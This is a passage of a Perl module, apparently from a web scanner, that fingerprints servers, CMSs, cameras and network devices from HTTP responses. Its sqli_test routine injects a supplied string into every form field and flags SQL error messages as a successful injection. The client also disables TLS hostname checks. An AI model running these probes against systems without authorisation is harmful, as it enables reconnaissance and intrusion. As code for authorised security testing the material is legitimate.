my ($poweredBy) = ($decoded_response =~ /X-Powered-By:(.*?)\n/i);
if ($poweredBy eq '')
	{	
	if($decoded_response =~ /laravel_session/m){$poweredBy="Laravel";} 			
	}

print "poweredBy $poweredBy \n" if ($debug);

# ($hours, $minutes, $second) = ($time =~ /(\d\d):(\d\d):(\d\d)/);

#my $title;#) =~ /<title>(.+)<\/title>/s;

$decoded_response =~ /<title(.{1,90})<\/title>/s ;
my $title =$1; 
$title =~ s/>|\n|\t|\r//g; #borrar saltos de linea
if ($title eq '')
	{($title) = ($decoded_response =~ /<title(.*?)\n/i);}

if ($title eq '')
	{($title) = ($decoded_response =~ /Title:(.*?)\n/i);}


$title = only_ascii($title);


#<meta name="geo.placename" content="Quillacollo" />
my ($geo) = ($decoded_response =~ /name="geo.placename" content="(.*?)"/i);
print "geo $geo \n" if ($debug);

#<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
 #meta name="Generator" content="Pandora 5.0" />
my ($Generator) = ($decoded_response =~ /name="Generator" content="(.*?)"/i);
print "Generator $Generator \n" if ($debug);

#<meta name="Version" content="10_1_7-52331">
my ($Version) = ($decoded_response =~ /name="Version" content="(.*?)"/i);
print "Version $Version \n" if ($debug);
$Generator = $Generator." ".$Version;

my ($description) = ($decoded_response =~ /name="description" content="(.*?)"/i);
if ($description eq '')
	{($description) = ($decoded_response =~ /X-Meta-Description:(.*?)\n/i);}
$description = only_ascii($description);	
print "description $description \n" if ($debug);


#<meta name="author" content="Instituto Nacional de Estadística - Centro de Desarrollo de Redatam">
my ($author) = ($decoded_response =~ /name="author" content="(.*?)"/i);
if ($author eq '')
	{($author) = ($decoded_response =~ /X-Meta-Author:(.*?)\n/i);}
$author = only_ascii($author);
print "author $author \n" if ($debug);


my ($langVersion) = ($decoded_response =~ /X-AspNet-Version:(.*?)\n/i);
print "langVersion $langVersion \n" if ($debug);

my ($proxy) = ($response_headers =~ /Via:(.*?)\n/i);
print "proxy $proxy \n" if ($debug);

my ($server) = ($response_headers =~ /Server:(.*?)\n/i);
print "server $server \n" if ($debug);

#WWW-Authenticate: Basic realm="Broadband Router"
my ($Authenticate) = ($response_headers =~ /WWW-Authenticate:(.*?)\n/i);
print "Authenticate $Authenticate \n" if ($debug);

#jquery.js?ver=1.12.4
my $jquery1;
my $jquery2;
($jquery1) = ($decoded_response =~ /jquery.js\?ver=(.*?)"/i);

									
if ($jquery1 eq '')								 #jquery/1.9.1/
	{($jquery1,$jquery2) = ($decoded_response =~ /jquery\/(\d+).(\d+)./i);}

if ($jquery1 eq '')								  #jquery-1.9.1.min	
	{($jquery1,$jquery2) = ($decoded_response =~ /jquery-(\d+).(\d+)./i);}


print "jquery $jquery1 \n" if ($debug);	

if ($jquery1 ne '')
	{$poweredBy = $poweredBy."| JQuery ".$jquery1.".".$jquery2;}	

if($decoded_response =~ /GASOLINERA/m)
	{$type=$type."|"."GASOLINERA";} 		
	
if($decoded_response =~ /Cisco Systems/i)
	{$type=$type."|"."cisco";} 		

if($decoded_response =~ /X-OWA-Version/i)
	{$type=$type."|"."owa";} 	

if($decoded_response =~ /FortiGate/i)
	{$type=$type."|"."FortiGate";} 	

if($decoded_response =~ /www.drupal.org/i)
	{$type=$type."|"."drupal";} 	
	
if($decoded_response =~ /wp-content|wp-admin|wp-caption/i)
	{$type=$type."|"."wordpress";} 		
		

if($decoded_response =~ /csrfmiddlewaretoken/i)
	{$type=$type."|"."Django";} 	

if($decoded_response =~ /IP Phone/i)
	{$type=$type."|"." IP Phone ";} 			

if($decoded_response =~ /X-Amz-/i)
	{$type=$type."|"."amazon";} 	

if($decoded_response =~ /X-Planisys-/i)
	{$type=$type."|"."Planisys";} 		

if($decoded_response =~ /phpmyadmin.css/i)
	{$type=$type."|"."phpmyadmin";} 		
	
if($decoded_response =~ /Set-Cookie: webvpn/i)
	{$type=$type."|"."ciscoASA";} 	
	
if($decoded_response =~ /Huawei/i)
	{$type=$type."|"."Huawei";} 	

if($decoded_response =~ /connect.sid|X-Powered-By: Express/i)
	{$type=$type."|"."Express APP";}	

if($decoded_response =~ /X-ORACLE-DMS/i)
	{$type=$type."|"."Oracle Dynamic Monitoring";}	

if($decoded_response =~ /www.enterprisedb.com"><img src="images\/edblogo.png"/i)
	{$type=$type."|"."Postgres web";}	

if($decoded_response =~ /src="app\//i)
	{$type=$type."|"."AngularJS";}			

if($decoded_response =~ /roundcube_sessid/i)
	{$type=$type."|"."Roundcube";}	 

if($decoded_response =~ /playback_bottom_bar/i)
	{$type=$type."|"."Dahua Camera";}	 	

if($decoded_response =~ /\/webplugin.exe/i)
	{$type=$type."|"."Dahua DVR";}	 		

if($decoded_response =~ /ftnt-fortinet-grid icon-xl/i)
	{$type=$type."|"."Fortinet";}	 			
	
	
	


if($decoded_response =~ /theme-taiga.css/i)
	{$type=$type."|"."Taiga";}	 
		
if($decoded_response =~ /X-Powered-By-Plesk/i)
	{$type=$type."|"."PleskWin";}	 

if($decoded_response =~ /Web Services/i)	
	{$type=$type."|"."Web Service";$title="Web Service" if ($title eq "");}	

if($decoded_response =~ /Acceso no autorizado/i)
	{$title="Acceso no autorizado" if ($title eq "");} 	
	
if($type eq '' && $decoded_response =~ /login/m)
	{$type=$type."|"."login";}	
	
if($decoded_response =~ /login__block__header/i)	
	{$type=$type."|"."login";$title="Panel de logueo" if ($title eq "");}	
			


if($decoded_response =~ /Hikvision Digital/i)
	{$title="Hikvision Digital";} 			
	
if($decoded_response =~ /FreeNAS/i)
	{$title="FreeNAS";} 			

if($decoded_response =~ /ciscouser/i)
	{$title="Cisco switch";} 

if($decoded_response =~ /pfsense-logo/i)
	{$title="Pfsense";} 

if($decoded_response =~ /servletBridgeIframe/i)
	{$title="SAP Business Objects";} 	

	

if($decoded_response =~ /content="Babelstar"/i)
	{$title="Body Cam";} 	
	

if( ($decoded_response =~ /login to iDRAC/i) && !($decoded_response =~ /Cisco/i)  )
	{$title="Dell iDRAC";} 

if($decoded_response =~ /portal.peplink.com/i)
	{$title="Web Admin PepLink";} 	
	


 my %data = (            
            "title" => $title,
            "poweredBy" => $poweredBy,
            "Authenticate" => $Authenticate,
            "geo" => $geo,
            "Generator" => $Generator,
            "description" => $description,
            "langVersion" => $langVersion,
            "redirect_url" => $redirect_url,
            "author" => $author,
            "proxy" => $proxy,
            "type" => $type,
            "server" => $server,
            "status" => $status
        );
        


my $scrubber = HTML::Scrubber->new( allow => [ qw[ form input] ] ); 	
	$scrubber->rules(        
         input => {			 
            name => 1,                       
        },  
        form => {
			 action => 1 ,                        
        },    
    );

my $final_content = $scrubber->scrub($decoded_response);
#print $final_content;
        
$self->html($final_content);
return %data;
		
}



sub sqli_test
{
my $self = shift;
my $headers = $self->headers;
my $rhost = $self->rhost;
my $rport = $self->rport;
my $debug = $self->debug;
my $ssl = $self->ssl;
my $html = $self->html;
my $url = $self->final_url;
#print "html  $html  \n" ;	
print "Tessting SQLi\n" if ($debug );
my ($inyection)=@_;

my @sqlerrors = ( 'error in your SQL syntax',
 'mysql_fetch',
 'sqlsrv_fetch_object',
 "Unclosed quotation mark after the character",
 'num_rows',
 "syntax error at or near",
 "SQL command not properly ended",
 'ORA-01756',
 "quoted string not properly terminated",
 'Error Executing Database Query',
 "Failed to open SQL Connection",
 'SQLServer JDBC Driver',
 'Microsoft OLE DB Provider for SQL Server',
 'Unclosed quotation mark',
 'ODBC Microsoft Access Driver',
 'Microsoft JET Database',
 'Error Occurred While Processing Request',
 'Microsoft OLE DB Provider for ODBC Drivers error',
 'Invalid Querystring',
 'OLE DB Provider for ODBC',
 'VBScript Runtime',
 'ADODB.Field',
 'BOF or EOF',
 'ADODB.Command',
 'JET Database',
 'mysql_fetch_array()',
 'Syntax error',
 'mysql_numrows()',
 'GetArray()',
 'FetchRow()');
 
my $error_response="";
my $pwned;
 
$html =~ /<form action="(.*?)"/;			
my $action = $1; 
print "action $action \n" if ($debug );

my $post_data = "";
while($html =~ /<input name="(.*?)"/g) 
{    
    $post_data = $post_data.$1."=XXX&";
}
chop($post_data); # delete last character (&)

$post_data =~ s/XXX/$inyection/g; 
print "post_data  $post_data  \n" if ($debug );

if ($post_data ne '')
{
	my $final_url = $url.$action;	
	print "final_url  $final_url  \n" if ($debug );
	$headers->header("Content-Type" => 'application/x-www-form-urlencoded');	
	my $response = $self->dispatch(url => $final_url, method => 'POST',post_data =>$post_data, headers => $headers);
	my $decoded_response = $response->decoded_content;
	
	#open (SALIDA,">sqli.html") || die "ERROR: No puedo abrir el fichero google.html\n";
	#print SALIDA $decoded_response;
	#close (SALIDA);   

	###### chech error in response #####
	foreach (@sqlerrors)
	{	
		 if($decoded_response =~ /$_/i)
		 {
			$error_response = $_;			
			$pwned=1;		
			last;
		  }
		else
			{$error_response = ""}
	}	
}
		

return($error_response);
}

################################### build objects ########################

################### build headers object #####################
sub _build_headers {   
#print "building header \n";
my $self = shift;
my $debug = $self->debug;
my $mostrarTodo = $self->mostrarTodo;
my $headers = HTTP::Headers->new;


my @user_agents=( "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36",
			  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:23.0) Gecko/20100101 Firefox/23.0",
			  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31",
			  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36");			   
			  
my $user_agent = @user_agents[rand($#user_agents+1)];    
print "user_agent $user_agent \n" if ($debug);

$headers->header('User-Agent' => "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"); 
$headers->header('Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'); 
$headers->header('Connection' => 'close'); 
$headers->header('Cache-Control' => 'max-age=0'); 
$headers->header('DNT' => '1'); 
#$headers->header('Content-Type' => 'application/x-www-form-urlencoded');
#$headers->header('Accept-Encoding' => [ HTTP::Message::decodable() ]);


return $headers; 
}


###################################### internal functions ###################


# remve acents and ñ
sub only_ascii
{
 my ($text) = @_;
 
$text =~ s/á/a/g; 
$text =~ s/é/e/g; 
$text =~ s/í/i/g; 
$text =~ s/ó/o/g; 
$text =~ s/ú/u/g;
$text =~ s/ñ/n/g; 

$text =~ s/Á/A/g; 
$text =~ s/É/E/g; 
$text =~ s/Í/I/g; 
$text =~ s/Ó/O/g; 
$text =~ s/Ú/U/g;
$text =~ s/Ñ/N/g;

return $text;
}


#Convert a hash in a string format used to send POST request
sub convert_hash
{
my ($hash_data)=@_;
my $post_data ='';
foreach my $key (keys %{ $hash_data }) {    
    my $value = $hash_data->{$key};
    $post_data = $post_data.uri_escape($key)."=".$value."&";    
}	
chop($post_data); # delete last character (&)
 #$post_data = uri_escape($post_data);
return $post_data;
}


sub dispatch {    
my $self = shift;
my $debug = $self->debug;
my %options = @_;

my $url = $options{ url };
my $method = $options{ method };
my $headers = $options{ headers };
my $response;

#print Dumper $headers;

if ($method eq 'POST_OLD')
  {     
   my $post_data = $options{ post_data };        
   $response = $self->browser->post($url,$post_data);
  }  
    
if ($method eq 'GET')
  { my $req = HTTP::Request->new(GET => $url, $headers);
    $response = $self->browser->request($req)
  }

if ($method eq 'OPTIONS')
  { my $req = HTTP::Request->new(OPTIONS => $url, $headers);
    $response = $self->browser->request($req)
  }  
  
if ($method eq 'POST')
  {     
   my $post_data = $options{ post_data };           
   my $req = HTTP::Request->new(POST => $url, $headers);
   $req->content($post_data);
   $response = $self->browser->request($req);    
  }  
  
if ($method eq 'POST_MULTIPART')
  {    	   
   my $post_data = $options{ post_data }; 
   $headers->header('Content_Type' => 'multipart/form-data');
    my $req = HTTP::Request->new(POST => $url, $headers);
   $req->content($post_data);
   #$response = $self->browser->post($url,Content_Type => 'multipart/form-data', Content => $post_data, $headers);
   $response = $self->browser->request($req);    
  } 

if ($method eq 'POST_FILE')
  { 
	my $post_data = $options{ post_data };         	    
	$headers->header('Content_Type' => 'application/xml');
    my $req = HTTP::Request->new(POST => $url, $headers);
    $req->content($post_data);
    #$response = $self->browser->post( $url, Content_Type => 'application/atom+xml', Content => $post_data, $headers);                 
    $response = $self->browser->request($req);    
  }  
      
  
return $response;
}

################### build browser object #####################	
sub _build_browser {    

my $self = shift;
my $rhost = $self->rhost;
my $rport = $self->rport;
my $ssl = $self->ssl;

my $debug = $self->debug;
my $mostrarTodo = $self->mostrarTodo;
my $proxy_host = $self->proxy_host;
my $proxy_port = $self->proxy_port;
my $proxy_user = $self->proxy_user;
my $proxy_pass = $self->proxy_pass;
my $proxy_env = $self->proxy_env;

my $max_redirect = $self->max_redirect;

print "building browser \n" if ($debug);


my $browser = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });        

$browser->timeout(15);
$browser->cookie_jar(HTTP::Cookies->new());
$browser->show_progress(1) if ($debug);
$browser->max_redirect($max_redirect);


if ($ssl eq '')
{
	print "Detecting SSL \n" if ($debug);
	my $ssl_output = `get_ssl_cert.py $rhost $rport 2>/dev/null`;
	if($ssl_output =~ /CN/m)
		{$self->ssl(1);print "SSL detected \n" if ($debug);}
	else
		{$self->ssl(0); print "NO SSL detected \n" if ($debug);}
}

print "proxy_env $proxy_env \n" if ($debug);

if ( $proxy_env eq 'ENV' )
{
print "set ENV PROXY \n";
$Net::HTTPS::SSL_SOCKET_CLASS = "Net::SSL"; # Force use of Net::SSL
$ENV{HTTPS_PROXY} = "http://".$proxy_host.":".$proxy_port;

}
elsif (($proxy_user ne "") && ($proxy_host ne ""))
{
 $browser->proxy(['http', 'https'], 'http://'.$proxy_user.':'.$proxy_pass.'@'.$proxy_host.':'.$proxy_port); # Using a private proxy
}
elsif ($proxy_host ne "")
   { $browser->proxy(['http', 'https'], 'http://'.$proxy_host.':'.$proxy_port);} # Using a public proxy
 else
   { 
      $browser->env_proxy;} # No proxy       

return $browser;     
}
    
}
1;

